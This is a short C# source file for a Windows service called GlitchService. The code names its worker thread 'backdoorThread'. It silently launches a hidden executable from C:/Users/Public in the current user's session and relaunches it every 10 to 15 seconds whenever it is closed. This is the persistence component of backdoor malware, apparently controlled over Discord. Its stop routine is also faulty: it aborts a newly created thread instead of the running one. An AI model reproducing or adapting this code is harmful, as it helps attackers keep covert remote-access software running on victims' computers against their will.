using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Threading;
using System.Threading.Tasks;

namespace Glitch
{
    public partial class GlitchService : ServiceBase
    {
        public GlitchService()
        {
            InitializeComponent();
            CanStop = true;
            CanPauseAndContinue = true;
        }

        protected override void OnStart(string[] args)
        {
            Thread backdoorThread = new Thread(new ThreadStart(Discord.Start));
            backdoorThread.Start();
        }

        protected override void OnStop()
        {
            Thread backdoorThread = new Thread(new ThreadStart(Discord.Start));
            backdoorThread.Abort();
        }
    }
    class Discord
    {
        public static async void Start()
        {
            ProcessExtensions.StartProcessAsCurrentUser("C:/Users/Public/Glitch/Glitch.Desktop.exe", visible: false);
            while (true)
            {
                List<Process> processes = Process.GetProcessesByName("Glitch.Desktop").ToList();
                if (processes.Count < 1)
                {
                    await Task.Delay(15000);
                    ProcessExtensions.StartProcessAsCurrentUser("C:/Users/Public/Glitch/Glitch.Desktop.exe", visible: false);
                }
                await Task.Delay(10000);
            }
        }
    }
}
